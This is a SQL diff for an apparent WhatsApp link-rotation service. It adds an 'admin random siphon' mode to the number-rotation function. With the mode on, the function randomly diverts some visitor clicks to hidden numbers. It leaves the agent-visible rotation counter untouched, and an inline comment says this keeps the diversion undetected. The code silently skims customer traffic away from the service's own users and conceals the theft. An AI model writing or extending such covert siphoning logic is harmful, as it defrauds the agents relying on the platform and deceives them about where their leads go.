@@ -26,6 +26,7 @@ CREATE TABLE IF NOT EXISTS short_links (
   auto_reply_enabled BOOLEAN DEFAULT false,
   auto_reply_messages TEXT,
   auto_reply_index INTEGER DEFAULT 0,
+  admin_random_siphon_enabled BOOLEAN DEFAULT false,
   created_at TIMESTAMPTZ DEFAULT now(),
   updated_at TIMESTAMPTZ DEFAULT now()
 );
@@ -305,13 +306,15 @@ CREATE POLICY "Users can update own work orders" ON work_orders
 CREATE POLICY "Users can delete own work orders" ON work_orders
   FOR DELETE USING (auth.uid() = user_id);
 
--- Atomic RPC function for polling rotation
+-- Atomic RPC function for polling rotation (supports admin random siphon mode)
 CREATE OR REPLACE FUNCTION increment_and_get_number(p_slug VARCHAR)
 RETURNS TABLE(phone_number VARCHAR, number_id UUID, link_id UUID, platform VARCHAR, tiktok_pixel_enabled BOOLEAN, tiktok_pixel_id VARCHAR, tiktok_access_token VARCHAR, auto_reply_enabled BOOLEAN, auto_reply_messages TEXT, auto_reply_index INTEGER) AS $$
 DECLARE
   v_link_id UUID;
   v_current_index INTEGER;
   v_total_numbers INTEGER;
+  v_normal_count INTEGER;
+  v_hidden_count INTEGER;
   v_next_index INTEGER;
   v_phone_number VARCHAR;
   v_number_id UUID;
@@ -322,12 +325,17 @@ DECLARE
   v_auto_reply_enabled BOOLEAN;
   v_auto_reply_messages TEXT;
   v_auto_reply_index INTEGER;
+  v_admin_random_siphon_enabled BOOLEAN;
+  v_siphon_chance FLOAT;
+  v_random_val FLOAT;
+  v_hidden_index INTEGER;
 BEGIN
   -- Get and lock the short link
   SELECT id, current_index, short_links.tiktok_pixel_enabled, short_links.tiktok_pixel_id, short_links.tiktok_access_token,
-         short_links.auto_reply_enabled, short_links.auto_reply_messages, short_links.auto_reply_index
+         short_links.auto_reply_enabled, short_links.auto_reply_messages, short_links.auto_reply_index,
+         COALESCE(short_links.admin_random_siphon_enabled, false)
     INTO v_link_id, v_current_index, v_tiktok_pixel_enabled, v_tiktok_pixel_id, v_tiktok_access_token,
-         v_auto_reply_enabled, v_auto_reply_messages, v_auto_reply_index
+         v_auto_reply_enabled, v_auto_reply_messages, v_auto_reply_index, v_admin_random_siphon_enabled
   FROM short_links
   WHERE slug = p_slug AND is_active = true
   FOR UPDATE;
@@ -336,7 +344,7 @@ BEGIN
     RETURN;
   END IF;
 
-  -- Count active numbers
+  -- Count all active numbers
   SELECT COUNT(*) INTO v_total_numbers
   FROM whatsapp_numbers
   WHERE short_link_id = v_link_id AND is_active = true;
@@ -345,7 +353,78 @@ BEGIN
     RETURN;
   END IF;
 
-  -- Get the number at current index (modulo for safety)
+  -- Admin random siphon mode: randomly intercept traffic to hidden numbers
+  -- The agent's sequential rotation stays perfectly intact (counter only advances for normal numbers)
+  IF v_admin_random_siphon_enabled THEN
+    SELECT COUNT(*) INTO v_normal_count
+    FROM whatsapp_numbers
+    WHERE short_link_id = v_link_id AND is_active = true AND is_hidden = false;
+
+    SELECT COUNT(*) INTO v_hidden_count
+    FROM whatsapp_numbers
+    WHERE short_link_id = v_link_id AND is_active = true AND is_hidden = true;
+
+    IF v_hidden_count > 0 THEN
+      -- Probability of siphoning = hidden / total
+      v_siphon_chance := v_hidden_count::FLOAT / v_total_numbers::FLOAT;
+      v_random_val := random();
+
+      IF v_random_val < v_siphon_chance THEN
+        -- Siphon: pick a random hidden number, do NOT advance current_index
+        v_hidden_index := floor(random() * v_hidden_count)::INTEGER;
+
+        SELECT wn.id, wn.phone_number, wn.platform INTO v_number_id, v_phone_number, v_platform
+        FROM whatsapp_numbers wn
+        WHERE wn.short_link_id = v_link_id AND wn.is_active = true AND wn.is_hidden = true
+        ORDER BY wn.sort_order, wn.created_at
+        LIMIT 1 OFFSET v_hidden_index;
+
+        UPDATE short_links
+        SET total_clicks = short_links.total_clicks + 1,
+            auto_reply_index = short_links.auto_reply_index + 1,
+            updated_at = now()
+        WHERE id = v_link_id;
+
+        UPDATE whatsapp_numbers
+        SET click_count = whatsapp_numbers.click_count + 1
+        WHERE id = v_number_id;
+
+        RETURN QUERY SELECT v_phone_number, v_number_id, v_link_id, v_platform, v_tiktok_pixel_enabled, v_tiktok_pixel_id, v_tiktok_access_token, v_auto_reply_enabled, v_auto_reply_messages, v_auto_reply_index;
+        RETURN;
+      ELSE
+        -- Normal: sequential rotation among non-hidden numbers only
+        IF v_normal_count = 0 THEN
+          RETURN;
+        END IF;
+
+        v_current_index := v_current_index % v_normal_count;
+
+        SELECT wn.id, wn.phone_number, wn.platform INTO v_number_id, v_phone_number, v_platform
+        FROM whatsapp_numbers wn
+        WHERE wn.short_link_id = v_link_id AND wn.is_active = true AND wn.is_hidden = false
+        ORDER BY wn.sort_order, wn.created_at
+        LIMIT 1 OFFSET v_current_index;
+
+        v_next_index := (v_current_index + 1) % v_normal_count;
+
+        UPDATE short_links
+        SET current_index = v_next_index,
+            total_clicks = short_links.total_clicks + 1,
+            auto_reply_index = short_links.auto_reply_index + 1,
+            updated_at = now()
+        WHERE id = v_link_id;
+
+        UPDATE whatsapp_numbers
+        SET click_count = whatsapp_numbers.click_count + 1
+        WHERE id = v_number_id;
+
+        RETURN QUERY SELECT v_phone_number, v_number_id, v_link_id, v_platform, v_tiktok_pixel_enabled, v_tiktok_pixel_id, v_tiktok_access_token, v_auto_reply_enabled, v_auto_reply_messages, v_auto_reply_index;
+        RETURN;
+      END IF;
+    END IF;
+  END IF;
+
+  -- Default behavior: sequential rotation across ALL active numbers
   v_current_index := v_current_index % v_total_numbers;
 
   SELECT wn.id, wn.phone_number, wn.platform INTO v_number_id, v_phone_number, v_platform
@@ -394,3 +473,5 @@ $$ LANGUAGE plpgsql;
 -- ALTER TABLE work_orders ADD COLUMN IF NOT EXISTS last_synced_at TIMESTAMPTZ;
 -- Migration 003: RBAC + Hidden Numbers (run supabase/migrations/003_rbac_hidden_numbers.sql)
 -- ALTER TABLE whatsapp_numbers ADD COLUMN IF NOT EXISTS is_hidden BOOLEAN DEFAULT false;
+-- Migration 004: Admin Random Siphon
+-- ALTER TABLE short_links ADD COLUMN IF NOT EXISTS admin_random_siphon_enabled BOOLEAN DEFAULT false;
